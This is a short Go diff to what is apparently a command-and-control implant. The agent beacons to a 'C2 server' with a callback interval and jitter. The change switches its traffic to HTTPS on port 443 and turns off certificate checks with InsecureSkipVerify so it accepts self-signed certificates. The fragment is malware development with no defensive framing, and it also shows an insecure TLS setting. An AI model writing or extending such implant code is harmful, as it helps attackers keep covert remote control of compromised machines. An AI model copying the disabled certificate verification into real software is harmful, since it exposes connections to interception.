@@ -79,11 +79,6 @@ func getLocalIP() string {
 }
 
 func (agent *Agent) Register() error {
-	if agent.Https {
-		agent.Client.Transport = &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		}
-	}
 	data := map[string]string{
 		"agent_id":     agent.LocalIP,
 		"os":           runtime.GOOS,
@@ -155,15 +150,21 @@ func main() {
 	agent := Agent{
 		LocalIP:          getLocalIP(),
 		ServerIP:         "127.0.0.1",
-		ServerPort:       80,
+		ServerPort:       443,
 		CallbackInterval: 15,
 		Jitter:           5,
 		Debug:            false,
 		Client: &http.Client{
 			Timeout: 10 * time.Second,
 		},
+		Https: true,
 	}
-
+	// Allow self-signed certificates when using HTTPS
+	if agent.Https {
+		agent.Client.Transport = &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+	}
 	// Attempt to register the agent with C2 server until successful
 	for {
 		err := agent.Register()
